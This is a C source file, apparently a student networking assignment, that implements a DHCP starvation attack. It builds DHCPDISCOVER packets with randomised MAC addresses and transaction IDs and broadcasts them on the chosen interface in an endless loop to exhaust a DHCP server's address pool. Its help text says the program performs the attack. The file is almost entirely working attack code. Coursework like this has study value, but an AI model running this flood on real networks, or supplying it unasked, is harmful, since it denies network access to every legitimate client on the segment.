/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 *                          IPK proj 2                       *
 *                                                           *
 *                    DHCP starvation attack                 *
 *                                                           *
 *                     author: Adam Venger                   *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

#include <netinet/in.h>
#include <net/if.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <arpa/inet.h>
#include <getopt.h>
#include "ipk-dhcpstarve.h"

#define DHCP_SERVER_PORT 67
#define DHCP_CLIENT_PORT 68

#define MAX_DHCP_CHADDR_LENGTH 16
#define MAX_DHCP_SNAME_LENGTH 64
#define MAX_DHCP_FILE_LENGTH 128
#define MAX_DHCP_OPTIONS_LENGTH 312    //minimum

#define DHCP_BROADCAST_FLAG 0x8000
#define BOOTREQUEST 1
#define DHCPDISCOVER 1
#define ETHERNET_HTYPE  1    //htype
#define CHADDR_LEN 6
#define DHCP_OPTION_MESSAGE_TYPE 53
#define END_OPTION 255

#define DEBUG 1

#ifdef DEBUG
#define debug_print(...) \
            fprintf(stderr, __VA_ARGS__);
#else
#define debug_print(...) \
            ;
#endif

char *network_interface_name;       // from prog arguments

void generate_chaddr(uint8_t *chaddr) {
    for (int i = 0; i<CHADDR_LEN; i++) {
        chaddr[i] = (uint8_t) rand();
    }
}

int create_dhcp_socket() {
    struct sockaddr_in myname;
    struct ifreq interface;
    int sock;
    int reuse_flag = 1;

    bzero(&myname, sizeof(myname));
    myname.sin_family = AF_INET;
    myname.sin_port = htons(DHCP_CLIENT_PORT);
    myname.sin_addr.s_addr = INADDR_ANY;
    bzero(&myname.sin_zero, sizeof(myname.sin_zero));

    /* create a socket for DHCP communications */
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        fprintf(stderr, "Error: Socket not created.\n");
        exit(EXIT_FAILURE);
    }

    reuse_flag = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *) &reuse_flag, sizeof(reuse_flag)) < 0) {
        fprintf(stderr, "Error: Reuse flag not set.\n");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char *) &reuse_flag, sizeof reuse_flag) < 0) {
        fprintf(stderr, "Error: Broadcast not set.\n");
        exit(EXIT_FAILURE);
    }

    /* bind socket to interface */
    strncpy(interface.ifr_ifrn.ifrn_name, network_interface_name, IFNAMSIZ);
    if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, (char *) &interface, sizeof(interface)) < 0) {
        fprintf(stderr, "Error: You need root privileges to run program.\n");
        exit(EXIT_FAILURE);
    }

    /* bind the socket */
    if (bind(sock, (struct sockaddr *) &myname, sizeof(myname)) < 0) {
        fprintf(stderr, "Error: Socket binding.\n");
        exit(EXIT_FAILURE);
    }

    debug_print("Socket %d created\n", sock);
    return sock;
}

/* sends DHCP discover in a loop */
void flood_DHCP_discover(int sock) {
    uint8_t chaddr[CHADDR_LEN] = {0};   // MAC address
    dhcp_packet discover_packet;
    struct sockaddr_in sockaddr_broadcast;

    /* clear the packet */
    bzero(&discover_packet, sizeof(discover_packet));

    discover_packet.op = BOOTREQUEST;
    discover_packet.htype=ETHERNET_HTYPE;
    discover_packet.hlen=CHADDR_LEN;
    discover_packet.flags = htons(DHCP_BROADCAST_FLAG);     //BROADCAST FLAG

    /*
     * hops   = 0
     * secs   = 0
     * ciaddr = 0
     * yiaddr = 0
     * siaddr = 0
     * giaddr = 0
     */

    /* magic cookie */
    discover_packet.options[0] = '\x63';
    discover_packet.options[1] = '\x82';
    discover_packet.options[2] = '\x53';
    discover_packet.options[3] = '\x63';

    /* DHCP message type */
    discover_packet.options[4] = DHCP_OPTION_MESSAGE_TYPE;
    discover_packet.options[5] = 1;
    discover_packet.options[6] = DHCPDISCOVER;

    /* END of options */
    discover_packet.options[7] = END_OPTION;

    /* send to broadcast */
    sockaddr_broadcast.sin_family = AF_INET;
    sockaddr_broadcast.sin_port = htons(DHCP_SERVER_PORT);
    sockaddr_broadcast.sin_addr.s_addr = INADDR_BROADCAST;
    bzero(&sockaddr_broadcast.sin_zero, sizeof(sockaddr_broadcast.sin_zero));

    /* change xid, MAC addr and send discover */
    while (1) {
        /* random transaction number */
        discover_packet.xid = htonl(rand());

        /* generate random MAC addr */
        generate_chaddr((uint8_t *)&chaddr);
        memcpy(discover_packet.chaddr, chaddr, CHADDR_LEN);

        /* send the DHCPDISCOVER packet out */
        ssize_t bytes_sent = sendto(sock,
                                    &discover_packet,
                                    sizeof(discover_packet),
                                    0,
                                    (const struct sockaddr *) &sockaddr_broadcast,
                                    sizeof(sockaddr_broadcast));

#ifdef DEBUG
        if (bytes_sent== sizeof(dhcp_packet)) {
            debug_print("\tDHCP DISCOVER was sent.\n");
        } else {
            debug_print("\tDHCP DISCOVER failed.\n");
        }
#endif

    }
}

void print_help() {
    printf("./ipk-dhcpstarve -i interface\n"
            "\tProgram needs root privileges to work\n"
            "\tProgram performs DHCP starvation attack.\n");
}

void parse_args(int argc, char **argv) {
    int c;
    while ((c = getopt (argc, argv, "i:")) != -1) {
        switch (c)
        {
            case 'i':
                network_interface_name = optarg;
                break;
            default:
                print_help();
                exit(0);
        }
    }
}

int main(int argc, char **argv) {
    struct in_addr offered_IP;
    struct in_addr server_id;

    printf("Program started.\n");

    srand(time(NULL));  //randomize

    parse_args(argc, argv);
    int dhcp_socket = create_dhcp_socket();

    /* flood DHCP DISCOVER packets*/
    flood_DHCP_discover(dhcp_socket);
}
